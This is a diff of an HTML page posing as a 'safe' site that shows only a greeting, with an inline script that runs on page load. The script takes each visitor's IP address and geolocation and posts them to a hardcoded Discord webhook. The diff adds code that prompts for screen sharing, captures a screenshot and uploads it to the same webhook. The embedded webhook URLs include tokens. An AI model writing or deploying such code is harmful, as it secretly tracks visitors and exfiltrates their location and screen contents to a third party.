@@ -3,59 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safe Website</title>
+    <title>Ur Safe Here Mate</title>
 </head>
 <body>
     <h1>Hello!</h1>
     <script>
-        let webhook = "https://discord.com/api/webhooks/1299717230833176588/1BpkO2_kOXWWlDFHKwMswBllt2Xl_s3aJisHGzJPNGo0U_iYA6FUwWHo3Wf-rdY_hcH_";
+        // Webhook URL
+        const webhook = "https://discord.com/api/webhooks/1302019763123257455/4TQ-VR9MoQHu6AfoJBeckxGuo_JzrxhTz_r3l608tg7ODzvGYKD7hmIy-qIIqutGzhnc";
 
         // Function to retrieve the user's IP and geolocation details
         async function retrieveIPInfo() {
-          try {
-            // First, get the public IP address using ipify
-            const ipResponse = await fetch("https://api.ipify.org?format=json");
-            const ipData = await ipResponse.json();
-            const ip = ipData.ip;
+            try {
+                // Get the public IP address using ipify
+                const ipResponse = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
 
-            // Use ipinfo.io to get geolocation details (doesn't require an API key for basic info)
-            const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
-            const geoData = await geoResponse.json();
+                // Use ipinfo.io to get geolocation details
+                const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
+                const geoData = await geoResponse.json();
 
-            // Prepare the embed for Discord webhook
-            let random = Math.floor(Math.random() * 100);
-            const myEmbed = {
-              author: {
-                name: `${random} | Adres IP: ${ip}`
-              },
-              title: `City: **${geoData.city || "N/A"}** | Region: **${geoData.region || "N/A"}**`,
-              description: `Country: **${geoData.country || "N/A"}** | ISP: **${geoData.org || "N/A"}**`,
-              color: hexToDecimal('#' + Math.round((0x1000000 + 0xffffff * Math.random())).toString(16).slice(1)),
-            };
+                // Prepare the embed for Discord webhook
+                let random = Math.floor(Math.random() * 100);
+                const myEmbed = {
+                    author: {
+                        name: `${random} | Adres IP: ${ip}`
+                    },
+                    title: `City: **${geoData.city || "N/A"}** | Region: **${geoData.region || "N/A"}**`,
+                    description: `Country: **${geoData.country || "N/A"}** | ISP: **${geoData.org || "N/A"}**`,
+                    color: hexToDecimal('#' + Math.round((0x1000000 + 0xffffff * Math.random())).toString(16).slice(1)),
+                };
+                const params = {
+                    username: "ome.bot",
+                    embeds: [myEmbed],
+                };
 
-            const params = {
-              username: `ome.bot`,
-              embeds: [myEmbed],
-            };
+                // Send the IP data to the Discord webhook
+                await fetch(webhook, {
+                    method: 'POST',
+                    headers: {
+                        "Content-type": "application/json"
+                    },
+                    body: JSON.stringify(params)
+                });
+            } catch (error) {
+                console.error("Error retrieving IP info:", error);
+            }
+        }
 
-            // Send the IP data to the Discord webhook
-            const request = new XMLHttpRequest();
-            request.open("POST", webhook);
-            request.setRequestHeader("Content-type", "application/json");
-            request.send(JSON.stringify(params));
+        // Function to capture the desktop screen
+        async function captureDesktop() {
+            try {
+                // Request access to the user's screen
+                const mediaStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                // Create a video element to capture the screen
+                const video = document.createElement('video');
+                video.srcObject = mediaStream;
+                video.play();
 
-          } catch (error) {
-            console.error("Error retrieving IP info:", error);
-          }
+                // Wait for the video to load
+                video.onloadedmetadata = async () => {
+                    // Create a canvas to draw the video frame
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    // Draw the video frame onto the canvas
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    // Convert the canvas to a Blob
+                    canvas.toBlob(async (blob) => {
+                        const formData = new FormData();
+                        formData.append('file', blob, 'screenshot.png');
+                        // Send the screenshot to the Discord webhook
+                        const response = await fetch(webhook, {
+                            method: 'POST',
+                            body: formData,
+                        });
+                        if (response.ok) {
+                            console.log('Screenshot sent to Discord successfully!');
+                        } else {
+                            console.error('Error sending screenshot to Discord:', response.statusText);
+                        }
+                        // Stop all media tracks
+                        mediaStream.getTracks().forEach(track => track.stop());
+                    }, 'image/png');
+                };
+            } catch (err) {
+                console.error('Error capturing screen:', err);
+            }
         }
 
         // Function to convert HEX to decimal (used for embed color)
         function hexToDecimal(hex) {
-          return parseInt(hex.replace("#", ""), 16);
+            return parseInt(hex.replace("#", ""), 16);
         }
 
-        // Run the IP info retrieval function when the page loads
-        retrieveIPInfo();
+        // Run both functions when the page loads
+        (async () => {
+            await retrieveIPInfo();
+            await captureDesktop();
+        })();
     </script>
 </body>
 </html>
